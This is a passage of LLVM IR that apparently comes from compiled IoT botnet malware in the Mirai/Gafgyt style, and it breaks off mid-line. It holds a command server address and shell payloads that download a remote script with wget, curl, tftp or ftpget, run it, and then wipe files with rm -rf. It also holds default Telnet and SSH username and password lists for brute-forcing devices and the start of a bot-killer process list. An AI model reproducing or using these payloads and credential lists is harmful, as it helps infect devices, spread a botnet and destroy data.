@.str.120 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@commServer = global [1 x i8*] [i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.121, i32 0, i32 0)], align 8
@.str.121 = private unnamed_addr constant [20 x i8] c"167.99.94.61.28:812\00", align 1
@phone = global [7 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.127, i32 0, i32 0), i8* null], align 16
@.str.122 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.123 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.124 = private unnamed_addr constant [8 x i8] c"sername\00", align 1
@.str.125 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@.str.126 = private unnamed_addr constant [6 x i8] c"Linux\00", align 1
@.str.127 = private unnamed_addr constant [9 x i8] c"9615-cdp\00", align 1
@Busybox_Payload = global i8* getelementptr inbounds ([543 x i8], [543 x i8]* @.str.128, i32 0, i32 0), align 8
@.str.128 = private unnamed_addr constant [543 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://167.99.94.61.28/bins.sh; curl -O http://167.99.94.61.28/bins.sh; /bin/busybox wget http://167.99.94.61.2/bin.sh; /bin/busybox tftp 167.99.94.61.28 -c get tftp1.sh; chmod 777 bins.sh; sh bins.sh; tftp 167.99.94.61.28 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp1.sh -g 167.99.94.61.28; chmod 777 tftp1.sh; sh tftp1.sh; ftpget -v -u anonymous -p anonymous -P 21 167.99.94.61.28 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp1.sh ftp1.sh; rm -rf *\0D\0A\00", align 1
@Payload = global i8* getelementptr inbounds ([168 x i8], [168 x i8]* @.str.129, i32 0, i32 0), align 8
@.str.129 = private unnamed_addr constant [168 x i8] c"cd /tmp; rm -rf *; cd /tmp/; wget http://167.99.94.61.28/bins.sh; sh bins.sh; rm -rf bins.sh; cd /tmp/; wget http://167.99.94.61.28/bins.sh; sh bins.sh; rm -rf bins.sh\00", align 1
@phonepayload = global i8* getelementptr inbounds ([170 x i8], [170 x i8]* @.str.130, i32 0, i32 0), align 8
@.str.130 = private unnamed_addr constant [170 x i8] c"cd /tmp; rm -rf *; cd /tmp/; wget http://167.99.94.61.28/bins.sh; sh bins.sh; rm -rf bins.sh; cd /tmp/; wget http://167.99.94.61.28/bins.sh; sh bins.sh; rm -rf bins.sh\0D\0A\00", align 1
@Telnet_Usernames = global [7 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.134, i32 0, i32 0)], align 16
@.str.131 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.132 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.133 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.134 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@Telnet_Passwords = global [7 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.134, i32 0, i32 0)], align 16
@.str.135 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.136 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.137 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@Mirai_Usernames = global [63 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.168, i32 0, i32 0)], align 16
@.str.138 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.139 = private unnamed_addr constant [15 x i8] c"Administrator\00\00", align 1
@.str.140 = private unnamed_addr constant [9 x i8] c"service\00\00", align 1
@.str.141 = private unnamed_addr constant [12 x i8] c"supervisor\00\00", align 1
@.str.142 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.143 = private unnamed_addr constant [8 x i8] c"admin1\00\00", align 1
@.str.144 = private unnamed_addr constant [15 x i8] c"administrator\00\00", align 1
@.str.145 = private unnamed_addr constant [8 x i8] c"666666\00\00", align 1
@.str.146 = private unnamed_addr constant [8 x i8] c"888888\00\00", align 1
@.str.147 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@.str.148 = private unnamed_addr constant [9 x i8] c"klv1234\00\00", align 1
@.str.149 = private unnamed_addr constant [8 x i8] c"Zte521\00\00", align 1
@.str.150 = private unnamed_addr constant [8 x i8] c"hi3518\00\00", align 1
@.str.151 = private unnamed_addr constant [7 x i8] c"jvbzd\00\00", align 1
@.str.152 = private unnamed_addr constant [6 x i8] c"anko\00\00", align 1
@.str.153 = private unnamed_addr constant [6 x i8] c"zlxx\00\00", align 1
@.str.154 = private unnamed_addr constant [14 x i8] c"7ujMko0vizxv\00\00", align 1
@.str.155 = private unnamed_addr constant [14 x i8] c"7ujMko0admin\00\00", align 1
@.str.156 = private unnamed_addr constant [8 x i8] c"system\00\00", align 1
@.str.157 = private unnamed_addr constant [6 x i8] c"ikwb\00\00", align 1
@.str.158 = private unnamed_addr constant [10 x i8] c"dreambox\00\00", align 1
@.str.159 = private unnamed_addr constant [9 x i8] c"realtek\00\00", align 1
@.str.160 = private unnamed_addr constant [10 x i8] c"00000000\00\00", align 1
@.str.161 = private unnamed_addr constant [9 x i8] c"1111111\00\00", align 1
@.str.162 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.163 = private unnamed_addr constant [7 x i8] c"54321\00\00", align 1
@.str.164 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.165 = private unnamed_addr constant [6 x i8] c"pass\00\00", align 1
@.str.166 = private unnamed_addr constant [8 x i8] c"meinsm\00\00", align 1
@.str.167 = private unnamed_addr constant [6 x i8] c"tech\00\00", align 1
@.str.168 = private unnamed_addr constant [8 x i8] c"fucker\00\00", align 1
@Mirai_Passwords = global [63 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.168, i32 0, i32 0)], align 16
@.str.169 = private unnamed_addr constant [8 x i8] c"xc3511\00\00", align 1
@.str.170 = private unnamed_addr constant [7 x i8] c"vizxv\00\00", align 1
@.str.171 = private unnamed_addr constant [9 x i8] c"xmhdipc\00\00", align 1
@.str.172 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.173 = private unnamed_addr constant [10 x i8] c"juantech\00\00", align 1
@.str.174 = private unnamed_addr constant [11 x i8] c"admin1234\00\00", align 1
@.str.175 = private unnamed_addr constant [6 x i8] c"1111\00\00", align 1
@.str.176 = private unnamed_addr constant [10 x i8] c"smcadmin\00\00", align 1
@.str.177 = private unnamed_addr constant [8 x i8] c"klv123\00\00", align 1
@SSH_Usernames = global [9 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.138, i32 0, i32 0)], align 16
@.str.178 = private unnamed_addr constant [10 x i8] c"ususario\00\00", align 1
@SSH_Passwords = global [9 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.138, i32 0, i32 0)], align 16
@Bot_Killer_Binarys = global [347 x i8*] [i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.188, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.255, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.256, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.257, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.258, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.259, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.260, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.261, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.262, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.263, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.264, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.265, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.266, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.267, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.268, i32 0, i32 0), i8* getelementptr inbounds ([13 x 